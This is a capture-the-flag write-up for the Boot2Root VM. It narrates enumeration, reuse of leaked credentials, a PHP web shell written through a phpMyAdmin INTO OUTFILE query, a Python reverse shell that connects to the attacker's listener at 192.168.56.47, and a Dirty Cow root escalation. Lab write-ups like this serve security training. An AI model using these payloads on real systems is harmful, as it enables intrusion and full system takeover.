# Boot2Root - Writeup

---

## Initial Reconnaissance and Service Discovery

I began by identifying the VM's IP address and open services. With the VM network in "HostOnly Network" mode, that uses **192.168.56.0/24** as default range.

Next, I ran `nmap 192.168.56.2/24`, which located the VM at **192.168.56.2**. The scan also revealed several open services: **21/tcp (FTP)**, **22/tcp (SSH)**, **80/tcp (HTTP)**, **143/tcp (IMAP)**, **443/tcp (HTTPS)**, and **993/tcp (IMAPS)**.

---

## Web Server Enumeration

A `curl` request to **http://192.168.56.2** displayed a "Hack me" coming soon page. By intentionally triggering an HTTP error, I confirmed the web server was **Apache**.

Then, I used `dirb` with its default wordlist to scan for hidden directories and virtual hosts. An **HTTP (port 80)** scan showed `/cgi-bin/`, `/fonts/`, `/forum`, `/index.html`, and `/server-status`. Accessing `/forum` resulted in a **403 Forbidden** error. An **HTTPS (port 443)** scan revealed more accessible directories: **https://192.168.56.2/forum/**, **https://192.168.56.2/phpmyadmin/**, and **https://192.168.56.2/webmail/**.

---

## Exploiting the Forum

The forum at **https://192.168.56.2/forum/** contained four posts. The first, by user **`lmezard`**, included an SSH connection log. I extracted lines with "invalid user" from the log using `curl --insecure 'https://192.168.1.22/forum/index.php?id=6' | grep 'invalid user'`. This revealed a peculiar entry: `Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2`. The string `!q\]Ej?*5K5cy*AJ` appeared to be a password, likely mistyped as a username during an SSH brute-force attempt. I tried this string as the password for the `lmezard` user on the forum, and it worked!

Logging into the forum as **`lmezard`** gave me access to the user's profile, which contained the email address: **`laurie@borntosec.net`**. The "Users" section also listed other usernames: `wandre`,`admin`, `qudevide`, `thor`, and `zaz`.

---

## Exploiting the Webmail

Using `laurie@borntosec.net` and the password `!q\]Ej?*5K5cy*AJ`, I successfully logged into **https://192.168.56.2/webmail/**. Inside the webmail, I found two emails. The "DB Access" email was particularly interesting, containing database credentials: **Login:** `root`, **Password:** `Fg-'kKXBj87E:aJ$`.

---

## Gaining Access to PhpMyAdmin

I used these new credentials to log into **https://192.168.56.2/phpmyadmin/**, which granted me `root` access to the database. Within the `forum` database, the `mlf2_userdata` table held user information, including hashed passwords. I attempted to crack the `sha1` hashes (which included a 10-character salt) using `hashcat` with the `rockyou.txt` wordlist, but it was unsuccessful.

Instead, I opted to inject a PHP backdoor into the web server. After testing various directories, I found that `/var/www/forum/templates_c/` was writable. I used the following SQL query to create a simple PHP shell: `SELECT 1, '<?php system($_GET["cmd"]." 2>&1"); ?>' INTO OUTFILE '/var/www/forum/templates_c/backdoor.php'`. This created `backdoor.php`, allowing arbitrary system commands via the `cmd` GET parameter. I confirmed its functionality by running: `curl --insecure 'https://192.168.56.2/forum/templates_c/backdoor.php?cmd=ls%20-la'`.

---

## Establishing a Reverse Shell

To get a more interactive shell, I decided on a Python reverse shell, as Python was available on the server and I needed a pseudo-terminal (pty) for commands like `su`. I used this Python one-liner: `python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.47",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/bash");'`.

I then URL-encoded this command and executed it via the backdoor. On my attacking machine, I set up `ncat` to listen for the incoming connection: `ncat -nvklp 1234`. Executing the URL-encoded Python command on the server initiated the reverse shell, connecting to my machine and granting me a bash shell as the `www-data` user: `www-data@BornToSecHackMe:/var/www/forum/templates_c$`.

---

## Privilege Escalation with Dirty Cow

The `uname -a` command on the compromised server revealed the kernel version: `Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux`.

A quick search for "linux 3.2 cve" immediately brought up the **Dirty Cow (CVE-2016-5195)** exploit. This local privilege escalation vulnerability affects the Linux kernel's copy-on-write mechanism and was relevant for the identified kernel version.

I selected a `dirty.c` exploit from the `dirtycow/dirtycow.github.io/wiki/PoCs` repository. This specific exploit creates a new root user, which is a safer approach for a reverse shell. I pasted the C code into a file named `dirty.c` in the `/tmp` directory on the victim server. Then, I compiled and executed the exploit: `gcc dirty.c -o dirty -pthread -lcrypt` followed by `./dirty`. When prompted, I entered `q` as the new password. Checking `/etc/passwd` confirmed the root password had been changed.

Finally, using `su root` with the new password `q` successfully granted me root privileges: `su root`, then `Password: q`, followed by `id` showing `uid=0(root) gid=0(root) groups=0(root)`. The root flag, named `README`, was located in the `/root` directory, marking the successful completion of the challenge.

